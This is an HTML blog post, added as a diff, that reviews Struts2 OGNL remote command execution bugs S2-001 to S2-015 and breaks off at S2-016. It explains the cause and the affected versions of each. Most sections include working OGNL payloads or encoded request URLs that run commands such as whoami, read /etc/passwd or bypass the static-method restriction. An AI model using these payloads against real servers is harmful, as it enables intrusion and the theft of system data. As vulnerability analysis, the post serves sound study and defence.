@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="一直都想分析下Struts2命令执行系列的的漏洞，但是能力有限，对java、Struts2都不熟悉。后来偶然看到rickgray的分析文章，尝试简单分析，做个记录o(╯□╰)o这是Struts2官方的各个版本历史记录 Security BulletinsStruts2命令执行的原因都是是通过Ognl表达式执行java代码，最终实现命令执行。所以应该需要先了解ognl表达式。 ongl表达式下面引用">
+<meta name="keywords" content="命令执行,struts2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts2命令执行系列回顾">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;vul-analysis&#x2F;struts2-command-execution-series-review.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="一直都想分析下Struts2命令执行系列的的漏洞，但是能力有限，对java、Struts2都不熟悉。后来偶然看到rickgray的分析文章，尝试简单分析，做个记录o(╯□╰)o这是Struts2官方的各个版本历史记录 Security BulletinsStruts2命令执行的原因都是是通过Ognl表达式执行java代码，最终实现命令执行。所以应该需要先了解ognl表达式。 ongl表达式下面引用">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-001.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-007.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-008png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-013.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-015.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-016.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-019.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-029.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-032.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-devmode.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-045.png">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;s2-001.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Struts2命令执行系列回顾</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/penetration/office-dde-utilization.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/vul-analysis/ImageMagick-CVE-2016-3714.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&text=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&is_video=false&description=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Struts2命令执行系列回顾&body=Check out this article: http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&title=Struts2命令执行系列回顾" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html&name=Struts2命令执行系列回顾&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ongl表达式"><span class="toc-number">1.</span> <span class="toc-text">ongl表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#触发途径"><span class="toc-number">2.</span> <span class="toc-text">触发途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-001"><span class="toc-number">3.</span> <span class="toc-text">s2-001</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-007"><span class="toc-number">4.</span> <span class="toc-text">s2-007</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-008"><span class="toc-number">5.</span> <span class="toc-text">s2-008</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-012"><span class="toc-number">6.</span> <span class="toc-text">s2-012</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-013-s2-014"><span class="toc-number">7.</span> <span class="toc-text">s2-013/s2-014</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-015"><span class="toc-number">8.</span> <span class="toc-text">s2-015</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-16"><span class="toc-number">9.</span> <span class="toc-text">s2-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-019"><span class="toc-number">10.</span> <span class="toc-text">s2-019</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-029"><span class="toc-number">11.</span> <span class="toc-text">s2-029</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-032"><span class="toc-number">12.</span> <span class="toc-text">s2-032</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-devMode"><span class="toc-number">13.</span> <span class="toc-text">s2-devMode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-045"><span class="toc-number">14.</span> <span class="toc-text">S2-045</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">15.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Struts2命令执行系列回顾
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-06-05T07:36:00.000Z" itemprop="datePublished">2017-06-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/vul-analysis/">vul-analysis</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/struts2/" rel="tag">struts2</a>, <a class="tag-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>一直都想分析下Struts2命令执行系列的的漏洞，但是能力有限，对java、Struts2都不熟悉。后来偶然看到rickgray的<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">分析文章</a>，尝试简单分析，做个记录o(╯□╰)o<br>这是Struts2官方的各个版本历史记录 <a href="http://struts.apache.org/docs/security-bulletins.html" target="_blank" rel="noopener">Security Bulletins</a><br>Struts2命令执行的原因都是是通过Ognl表达式执行java代码，最终实现命令执行。所以应该需要先了解ognl表达式。</p>
+<h3 id="ongl表达式"><a href="#ongl表达式" class="headerlink" title="ongl表达式"></a>ongl表达式</h3><p>下面引用来自<a href="http://drops.wooyun.org/papers/340" target="_blank" rel="noopener">OGNL设计及使用不当造成的远程代码执行漏洞</a></p>
+<blockquote>
+<p>OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言（Expression<br>Language，简称为EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。<br>OGNL三要素：(以下部分摘抄互联网某处,我觉得说得好)</p>
+<ol>
+<li>表达式（Expression）</li>
+</ol>
+<p>表达式是整个OGNL的核心，所有的OGNL操作都是针对表达式的解析后进行的。表达式会规定此次OGNL操作到底要干什么。我们可以看到，在上面的测试中，name、department.name等都是表达式，表示取name或者department中的name的值。OGNL支持很多类型的表达式，之后我们会看到更多。</p>
+<ol start="2">
+<li>根对象（Root Object）</li>
+</ol>
+<p>根对象可以理解为OGNL的操作对象。在表达式规定了“干什么”以后，你还需要指定到底“对谁干”。在上面的测试代码中，user就是根对象。这就意味着，我们需要对user这个对象去取name这个属性的值（对user这个对象去设置其中的department中的name属性值）。</p>
+<ol start="3">
+<li>上下文环境（Context）</li>
+</ol>
+<p>有了表达式和根对象，我们实际上已经可以使用OGNL的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在OGNL的内部，所有的操作都会在一个特定的环境中运行，这个环境就是OGNL的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定OGNL的操作“在哪里干”。<br>OGN L的上下文环境是一个Map结构，称之为OgnlContext。上面我们提到的根对象（Root<br>Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root<br>Object）的存取操作的表达式是不需要增加#符号进行区分的。</p>
+<p>表达式功能操作清单：</p>
+<pre><code>1. 基本对象树的访问
+对象树的访问就是通过使用点号将对象的引用串联起来进行。
+例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx
+
+2. 对容器变量的访问
+对容器变量的访问，通过#符号加上表达式进行。
+例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx
+
+3. 使用操作符号
+OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, in, not in等。
+
+4. 容器、数组、对象
+OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]
+同时，OGNL支持对Map的按键值查找：
+例如：#session[&apos;mySessionPropKey&apos;]
+不仅如此，OGNL还支持容器的构造的表达式：
+例如：{&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;}构造一个List，#{&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;}构造一个Map
+你也可以通过任意类对象的构造函数进行对象新建：
+例如：new Java.net.URL(&quot;xxxxxx/&quot;)
+
+5. 对静态方法或变量的访问
+要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：
+例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources
+
+6. 方法调用
+直接通过类似Java的方法调用方式进行，你甚至可以传递参数：
+例如：user.getName()，group.users.size()，group.containsUser(#requestUser)
+
+7. 投影和选择
+OGNL支持类似数据库中的投影（projection） 和选择（selection）。
+投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.{XXX}，其中XXX 是这个集合中每个元素的公共属性。
+例如：group.userList.{username}将获得某个group中的所有user的name的列表。
+选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.{X YYY}，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：
+? 选择满足条件的所有元素
+^ 选择满足条件的第一个元素
+$ 选择满足条件的最后一个元素
+例如：group.userList.{? #txxx.xxx != null}将获得某个group中user的name不为空的user的列表。</code></pre></blockquote>
+<p>所以理论上外部某些参数能够进入OGNL流程，那么可以执行恶意代码，而且Struts2大量地使用了OGNL，导致漏洞触发率大大增加。</p>
+<h3 id="触发途径"><a href="#触发途径" class="headerlink" title="触发途径"></a>触发途径</h3><p>通过对一系列的struts2的poc观察，一般是通过修改StaticMethodAccess或是创建ProcessBuilder对象。</p>
+<pre><code>#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true // 用来授权允许调用静态方法
+或
+new java.lang.ProcessBuilder(new java.lang.String[]{&apos;cat&apos;,&apos;/etc/passwd&apos;})).start()</code></pre><p>但struts2加强了ognl的验证，allowStaticMethodAccess已经变成的final属性，但是任然有方法可以绕过。</p>
+<h3 id="s2-001"><a href="#s2-001" class="headerlink" title="s2-001"></a>s2-001</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-001.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-001.html</a> </p>
+<p>影响版本：Struts 2.0.0 -Struts 2.0.8 </p>
+<p>修复摘要：数据 re-display 时禁止执行 OGNL 表达式</p>
+<p>该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}<br>进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value}对提交的数据执行了一次 OGNL 表达式解析。</p>
+</blockquote>
+<p>Poc:<br>获取tomcat执行路径:</p>
+<pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre><p>获取Web路径:</p>
+<pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()}</code></pre><p>命令执行：</p>
+<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-001.png" alt=""></p>
+<h3 id="s2-007"><a href="#s2-007" class="headerlink" title="s2-007"></a>s2-007</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-007.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-007.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.2.3</p>
+<p>修复摘要：在转换的过程中进行字符过滤</p>
+<p>修复补丁：<a href="https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892" target="_blank" rel="noopener">https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892</a></p>
+<p>当配置了验证规则 <ActionName>-validation.xml<br>时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个<br>UserAction：</p>
+<pre><code>(...)
+public class UserAction extends ActionSupport {
+    private Integer age;
+    private String name;
+    private String email;
+
+(...)</code></pre><p>然后配置有 UserAction-validation.xml：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;!DOCTYPE validators PUBLIC
+    &quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;
+    &quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;&gt;
+&lt;validators&gt;
+    &lt;field name=&quot;age&quot;&gt;
+        &lt;field-validator type=&quot;int&quot;&gt;
+            &lt;param name=&quot;min&quot;&gt;1&lt;/param&gt;
+            &lt;param name=&quot;max&quot;&gt;150&lt;/param&gt;
+        &lt;/field-validator&gt;
+    &lt;/field&gt;
+&lt;/validators&gt;</code></pre><p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 “‘“ + value + “‘“ 然后对其进行 OGNL<br>表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意<br>OGNL 表达式。</p>
+</blockquote>
+<p>Poc:</p>
+<pre><code>&apos; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())) + &apos;</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-007.png" alt=""></p>
+<h3 id="s2-008"><a href="#s2-008" class="headerlink" title="s2-008"></a>s2-008</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-008.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-008.html</a></p>
+<p>影响版本：Struts 2.1.0 - Struts 2.3.1</p>
+<p>修复摘要：添加参数名和 Cookie 名白名单 acceptedParamNames = “[a-zA-Z0-9.][()_’]+”;</p>
+<p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对<br>Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启<br>devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx<br>所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug<br>模式的应用到服务器上作为后门也是有可能的。</p>
+<p>例如在 devMode 模式下直接添加参数 ?debug=command&amp;expression=<OGNL EXP> 会直接执行后面的<br>OGNL 表达式，因此可以直接执行命令（注意转义）：</p>
+</blockquote>
+<p>Poc:</p>
+<pre><code>http://localhost:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29)</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-008png" alt=""></p>
+<h3 id="s2-012"><a href="#s2-012" class="headerlink" title="s2-012"></a>s2-012</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-012.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-012.html</a></p>
+<p>影响版本：Struts 2.0.0 － Struts 2。3.13</p>
+<p>修复摘要：默认禁用 OGNLUtil 类的 OGNL 表达式执行</p>
+<p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
+<pre><code>&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;         &lt;action</code></pre><p>name=”user” class=”com.demo.action.UserAction”&gt;             <result
+name="redirect" type="redirect">/index.jsp?name=${name}</result><br>            <result name="input">/index.jsp</result>             <result
+name="success">/index.jsp</result>         </action>     </package> 这里<br>UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name}<br>获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p>
+</blockquote>
+<p>Poc:</p>
+<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;cat&quot;, &quot;/etc/passwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><h3 id="s2-013-s2-014"><a href="#s2-013-s2-014" class="headerlink" title="s2-013/s2-014"></a>s2-013/s2-014</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-013.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-013.html</a>,<br><a href="https://struts.apache.org/docs/s2-014.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-014.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.3.14 (Struts 2.3.14.1)</p>
+<p>修复摘要：在对标签进行请求参数操作时禁用 OGNL 表达式解析 Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个<br>includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p>
+<p>none - 链接不包含请求的任意参数值（默认） get - 链接只包含 GET 请求中的参数和其值 all - 链接包含 GET 和<br>POST 所有参数和其值 若设置了 includeParams=”get” 或者<br>includeParams=”all”，在获取对应类型参数时后端会对参数值进行 OGNL 表达式解析，因此可以插入任意 OGNL<br>表达式导致命令执行</p>
+</blockquote>
+<p>Poc:</p>
+<pre><code>${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream(),#b=new
+java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new
+char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
+// 或
+${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())}</code></pre><p>如:</p>
+<pre><code>http://localhost:8080/S2-013/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&apos;whoami&apos;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&apos;dbapp%3D&apos;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-013.png" alt=""></p>
+<blockquote>
+<p>S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 ${ognl_exp} OGNL 表达式执行的方式，因此<br>S2-014 是对其的补丁加强。</p>
+</blockquote>
+<pre><code>http://localhost:8080/S2-013/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D</code></pre><h3 id="s2-015"><a href="#s2-015" class="headerlink" title="s2-015"></a>s2-015</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-015.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-015.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.3.14.2</p>
+<p>修复摘要：针对 Action 名称进行默认字符限制 [a-z][A-Z][0-9][.-_!/] 漏洞产生于配置了 Action 通配符<br>*，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p>
+<pre><code>&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;         &lt;action name=&quot;*&quot;</code></pre><p>class=”com.demo.action.PageAction”&gt;             <result>/{1}.jsp</result><br>        </action>     </package> 上述配置能让我们访问 name.action 时使用 name.jsp<br>来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name<br>值的位置比较特殊，一些特殊的字符如 / “ <br>都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p>
+<p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了<br>SecurityMemberAccess 类中的  setAllowStaticMethodAccess 方法，因此在 2.3.14.2<br>版本以后都不能直接通过 #_memberAccess[‘allowStaticMethodAccess’]=true<br>来修改其值达到重获静态方法调用的能力。</p>
+<p>这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 (new<br>java.lang.ProcessBuilder(‘calc’)).start() 来解决，另外还可以借助 Java 反射机制去间&gt;接修改：<br>    <code>#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true)</code></p>
+</blockquote>
+<p>Poc:</p>
+<pre><code>http://localhost:8080/S2-015/${%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23f=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())}.action</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-015.png" alt=""></p>
+<h3 id="s2-16"><a href="#s2-16" class="headerlink" title="s2-16"></a>s2-16</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-016.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-016.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.3.15</p>
